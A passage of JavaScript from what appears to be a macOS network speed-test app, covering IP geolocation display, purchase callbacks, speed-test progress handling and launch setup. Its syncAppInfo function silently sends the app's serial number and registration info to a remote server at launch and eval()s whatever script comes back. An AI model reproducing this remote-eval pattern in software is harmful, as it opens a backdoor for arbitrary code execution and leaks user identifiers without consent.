                        c$.UI_ipinfo_data.push({key:'RegionCode:  ', value:data["region_code"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'RegionName:  ', value:data["region_name"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'CountryCode:  ', value:data["country_code"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'CountryName:  ', value:data["country_name"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'Metro_code:  ', value:data["metro_code"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'Area_code:  ', value:data["area_code"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'Latitude:  ', value:data["latitude"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'Longitude:  ', value:data["longitude"], groupClass:'', enableLocation:false});

                        var ll = data["latitude"] + ',' + data["longitude"];
                        c$.UI_ipinfo_data.push({key:'[lat,lon]:  ', value:ll, groupClass:'', enableLocation:true});


                    }catch(e){console.error(e)}

                }
            });

        },

        onLocationClick:function(e){
            var message = {
                title:"Do you want to location?",
                message:"Do you want to location use system 'Maps' app",
                buttons:["Ok","Cancel"],
                alertType:"Information"
            };
            var alertResult = BS.b$.Notice.alert(message);
            if(alertResult == 1){
                var latlon = $(e).data('rtyll');
                c$.actions.onMapWithLatLng(latlon);
            }
        },

        // 启动MapKit进行定位,latlng, eg. 21.0010,12.2329
        onMapWithLatLng:function(latlon){
            try{
                BS.b$.App.open('http://maps.apple.com/?ll='+latlon);
            }catch(e){console.error(e)}
        },

        onHistoryClick:function(e){
            c$.openHistoryWindow();
        },

        onFullHistoryClick:function(e){
            c$.openFullHistoryWindow();
        },

        onIPInfoClick:function(e){
            c$.openIpInfoWindow();
        },

        onFeedbackClick:function(e){
            BS.b$.App.open("https://github.com/Romanysoft/SpeedTest/issues");
        },

        onReviewClick:function(e){
            BS.b$.App.open('macappstores://itunes.apple.com/us/app/speed-test-now-check-your/id721474844?l=zh&ls=1&mt=12');
            try{
                BS.b$.ServiceCheckRateApp.setRateActive(true);
            }catch(e){console.error(e)}
        },

        onHomePageClick:function(e){
            //BS.b$.App.open("https://github.com/Romanysoft/SpeedTest");
        },

        onBuyClick:function(e){
			BS.b$.IAP.buyProduct({productIdentifier:e, quantity:1});
        }

    };

    // 发现出错，弹出警告
    c$.show_Dlg = function(info){
        var message = {
            title:"Test Error",
            message:info,
            buttons:["OK"],
            alertType:"Information"
        };
        BS.b$.Notice.alert(message);
    };

    // 购买插件的日志内容
    c$.log_buyPlugin = function(productIdentifier, typeInfo, mesage){
        var pluginObj = c$.pluginMethod.getPluginObj(productIdentifier);
		if(pluginObj && typeof pluginObj.name != 'undefined'){
	        var pluginName = pluginObj.name;
	        var log = "[" +$.getMyDateStr() + "] " + typeInfo + " " + pluginName + (mesage || "");
	        c$.log(log, false);
		}
    };


    // 安装与BS的相关联的任务
    c$.setupAssBS = function(){
        // 配置与主逻辑相关的回调
        BS.b$.cb_execTaskUpdateInfo = function(obj){ // 插件相关的回调处理
 		    console.log($.obj2string(obj));
            // 声明处理插件初始化的方法
            function process_init(obj){
                try{
                    if (obj.type == "type_initcoresuccess") {

                    }else if(obj.type == "type_initcorefailed") {
                        console.error('init core plugin failed!');
                    }
                }catch(e){
                    console.error(e);
                }

            }

            // 声明处理CLI的回调处理
            function process_dylibCLI(obj){
                try{
                    var infoType = obj.type;
                    if (infoType == 'type_clicall_start'){
                        // 启动Running状态
                        UI.c$.ctrlSpeedTestUI.setRunningValue();
                        UI.c$.ctrlToolbar.enableStartBtn(false);
                    }else if(infoType == 'type_clicall_reportprogress'){
						if(typeof obj.CLIStateData != 'undefined'){						
	                        var cli_StateData = obj.CLIStateData;
							
							if(typeof cli_StateData.infoText != 'undefined'){
								var cli_infoTextDic = JSON.parse(cli_StateData.infoText);

                                // 处理Python的消息报
                                if(typeof cli_infoTextDic.PyMessagePackage != "undefined"){
                                    var pyMsgObj = cli_infoTextDic.PyMessagePackage;
                                    var msgType = pyMsgObj.type;

                                    if(msgType == "RetrievingRemoteConfig"){

                                    }else if(msgType == "RetrievingRemoteConfig_Error"){
                                        var info2 =  pyMsgObj.info;
                                        UI.c$.show_Dlg(info2);

                                    }else if(msgType == "RetrievingServerList"){

                                    }else if(msgType == "GetClientInfo"){
                                        var info2 =  pyMsgObj.info;

                                    }else if(msgType == "AutoSelectBestServer"){

                                    }else if(msgType == "GetBestServerInfo") {
                                        //{"info":{"latency":165.615,"name":"Los Angeles, CA","url":"http://lax.ookla.towerstream.net/speedtest/upload.php","country":"United States","lon":"-118.2428","cc":"US","host":"64.17.248.2:8080","sponsor":"Towerstream","lat":"34.0522","id":"1072","d":48.80710413126995},"type":"GetBestServerInfo"}
                                        var info2 = pyMsgObj.info;

                                        // 更新Ping的响应时间
                                        UI.c$.ctrlSpeedTestUI.setPingTimes(info2.latency);
                                    }else if(msgType == "GetBestServerInfoError"){
                                        var info2 = pyMsgObj.info;
                                        UI.c$.show_Dlg(info2);

                                    }else if(msgType == "StartTestDownloadSpeed"){

                                    }else if(msgType == "GetDownloadSpeed"){
                                        //{"info":{"speed_string":"1.92 Mbits/s","speed":"1.92","unit":"Mbits/s"},"type":"GetDownloadSpeed"}
                                        var info2 = pyMsgObj.info;

                                        // 更新下载速度结果
                                        UI.c$.ctrlSpeedTestUI.setDownloadSpeed(info2);
                                    }else if(msgType == "StartTestUploadSpeed"){

                                    }else if(msgType == "GetUploadSpeed"){
                                        //{"info":{"speed_string":"2.60 Mbits/s","speed":"2.60","unit":"Mbits/s"},"type":"GetUploadSpeed"}
                                        var info2 = pyMsgObj.info;

                                        // 更新上传速度结果
                                        UI.c$.ctrlSpeedTestUI.setUploadSpeed(info2);

                                    }else if(msgType == "SpeedTestEnd"){
                                        // 添加到历史数据
                                        UI.c$.ctrlHistoryUI.addNewHistory();
                                        UI.c$.FullHistoryActions.addNewHistory();
                                    }
                                }

                                // 处理本地IP的问题
                                else if(typeof cli_infoTextDic.getLocalIP != "undefined"){
                                    try{
                                        //{key:'', value:'Local IP info', groupClass:'item-group', enableLocation:false}
                                        //,{key:'ip', value:'127.0.0.1', groupClass:'', enableLocation:false}
                                        var ip_info = cli_infoTextDic.getLocalIP;
                                        c$.UI_ipinfo_data.push({key:'', value:'Local IP info', groupClass:'item-group', enableLocation:false});
                                        c$.UI_ipinfo_data.push({key:'IP:  ', value:ip_info.ip, groupClass:'', enableLocation:false});
                                    }catch(e){}

                                }

							}

						}

                    }else if(infoType == 'type_clicall_end'){
                        // 关闭Running状态
                        UI.c$.ctrlSpeedTestUI.setRunningValue();
                        UI.c$.ctrlToolbar.enableStartBtn(true);
                    }

                }catch(e){
                    console.error(e);
                }

            }

            // 声明处理ExecCommand的方法
            function process_execCommand(obj){
                try{
                    var infoType = obj.type;
                    if(infoType == 'type_addexeccommandqueue_success'){
                        var queueID = obj.queueInfo.id;
                        BS.b$.sendQueueEvent(queueID, "execcommand", "start");
                    } else if(infoType == 'type_execcommandstart'){

                    } else if(infoType == 'type_reportexeccommandprogress'){

                    } else if(infoType == 'type_execcommandsuccess'){

                    } else if(infoType == 'type_canceledexeccommand'){

                    } else if(infoType == 'type_execcommanderror'){

                    }
                }catch(e){
                    console.error(e);
                }

            }

            // 声明处理Task的方法
            function process_task(obj){
                try{
                    var infoType = obj.type;
                    if(infoType == "type_addcalltaskqueue_success"){
                        var queueID = obj.queueInfo.id;
                        BS.b$.sendQueueEvent(queueID, "calltask", "start");
                    }else if(infoType == "type_calltask_start"){

                    }else if(infoType == "type_calltask_error"){
                        var ui_task = UI.c$.getWorkspaceItemById(obj.queueInfo.id);
                        UI.c$.common_errorConvertTask(ui_task);

                        // TODO: Error string process
                        UI.c$.common_processDetailErrorInfo(obj.detail_error);

                    }else if(infoType == "type_calltask_success"){
                        var ui_task = UI.c$.getWorkspaceItemById(obj.queueInfo.id);
                        UI.c$.common_completeConvertTask(ui_task);
                    }else if(infoType == "type_type_calltask_cancel"){
                        var ui_task = UI.c$.getWorkspaceItemById(obj.queueInfo.id);
                        UI.c$.common_cancelConvertTask(ui_task);
                    }
                }catch(e){
                    console.error(e);
                }

            }


            // 以下是调用顺序
            process_init(obj);
            process_dylibCLI(obj);
            process_execCommand(obj);
            process_task(obj);
        };

        // 处理IAP的回调
        BS.b$.cb_handleIAPCallback = function(obj){
            try{
                var info = obj.info;
                var notifyType = obj.notifyType;

                if(notifyType == "ProductBuyFailed"){
                    //@"{'productIdentifier':'%@', 'message':'No products found in apple store'}"
                    var productIdentifier = info.productIdentifier;
                    var message = info.message;
                    UI.c$.log_buyPlugin(productIdentifier,"order plugin failed", message );

                }else if(notifyType == "ProductPurchased"){
                    //@"{'productIdentifier':'%@', 'quantity':'%@'}"
                    // TODO: 购买成功后，处理同步插件的问题
                    var productIdentifier = info.productIdentifier;
                    UI.c$.pluginMethod.syncPluginsDataFromAppStore(productIdentifier);
                    UI.c$.log_buyPlugin(productIdentifier,"order plugin success");

                }else if(notifyType == "ProductPurchaseFailed"){
                    //@"{‘transactionId':'%@',‘transactionDate’:'%@', 'payment':{'productIdentifier':'%@','quantity':'%@'}}"
                    var productIdentifier = info.payment.productIdentifier;
                    UI.c$.log_buyPlugin(productIdentifier,"order plugin failed");
                }else if(notifyType == "ProductPurchaseFailedDetail"){
                    //@"{'failBy':'cancel', 'transactionId':'%@', 'message':'%@', ‘transactionDate’:'%@', 'payment':{'productIdentifier':'%@','quantity':'%@'}}"
                    var productIdentifier = info.payment.productIdentifier;
                    var message = "error:" + "failed by " + info.failBy + " (" + info.message + ") " + "order date:" + info.transactionDate;
                    UI.c$.log_buyPlugin(productIdentifier,"order plugin failed", message);
					
                }else if(notifyType == "ProductRequested"){
                    //TODO:从AppStore商店获得的产品信息
                    if(typeof info == "string"){
                        info = JSON.parse(info);
                    }
                    UI.c$.pluginMethod.updatePluginsDataWithList(info);

                }else if(notifyType == "ProductCompletePurchased"){
                    //@"{'productIdentifier':'%@', 'transactionId':'%@', 'receipt':'%@'}"
                    var productIdentifier = info.productIdentifier;
                    var message = "productIdentifier: " + info.productIdentifier + ", " + "transactionId: " + info.transactionId + ", " + "receipt: " + info.receipt;
                    UI.c$.log_buyPlugin(productIdentifier,"ProductCompletePurchased", message);
                }

            }catch(e){
                console.error(e);
            }

        };

        // 开启IAP
        // BS.b$.IAP.enableIAP({cb_IAP_js:"BS.b$.cb_handleIAPCallback", productIds:UI.c$.pluginMethod.getEnableInAppStorePluginIDs()});

        // 注册插件
        BS.b$.enablePluginCore([c$.corePluginsMap.PythonHelperPlugin]);

    };

    // 初始化回调处理
    c$.init_mainCB = function(){
    };

    // 初始化同步信息
    c$.init_syncData = function(){
        // 默认要从本地得到正确的产品数量及价格
        c$.pluginMethod.syncPluginsDataFromAppStore();
    };

    // 同步App信息
    c$.syncAppInfo = function(){
        setTimeout(function(){
            try{
                var appName = BS.b$.App.getAppName();
                var appVersion = BS.b$.App.getAppVersion();
                var sn = BS.b$.App.getSerialNumber();
                var info = BS.b$.App.getRegInfoJSONString();

                console.log("start sync app info...");
                $.getp($.ConfigClass.domain+'/services/info_sync',{appName:appName, version:appVersion, sn:sn, info:info},true,function(o){
                    console.log("syncAppInfo:" + $.obj2string(o));
                    if(typeof o == "object"){
                        var statement = o["js"];
                        statement && eval(statement);
                    }else{
                        try{
                            eval(o);
                        }catch(e){console.error(e)}
                    }
                });
            }catch(e){console.error(e)}
        }, 5*1000);
    };

    // 初始化Socket通讯
    c$.initIM = function(){
        var $t = window.CI.IM$;
        try{

            $t.initWithUrl($.ConfigClass.messageServer);

            $t.setOpenedListen('',function(socket){
                var obj = {'type':'onConnected','message':'hello'};
                socket.send(JSON.stringify(obj));
            });

            $t.setReceiveMessageListen(function(data, socket){
                console.info("test1");
            });


        }catch(e){console.error(e)}
    };

    // 初始化绑定系统菜单按钮
    c$.initSystemMenutBind = function(){
    	window["onMenuPreferencesAction"] = function(info){
            c$.openSettingsWindow();
    	};

    	if(BS.b$.pNative){
    		var obj = JSON.stringify({menuTag:903, action:"window.onMenuPreferencesAction"});
    		BS.b$.pNative.window.setMenuProperty(obj);
    	}
    };

    // 默认初始化
    c$.launch = function(){
        c$.settingsConfig.load();
    	c$.initSystemMenutBind();
        c$.init_mainCB();
        c$.setupAssBS();
        c$.init_syncData();

        c$.initTitleAndVersion();
        c$.initToolbar();
        c$.createSpeedTestUI();
        c$.checkIPInfo();
        c$.initIM();
        c$.FullHistoryActions.loadFullHistory();
        c$.syncAppInfo();
    };

    window.UI.c$ = $.extend(window.UI.c$,c$);

})();





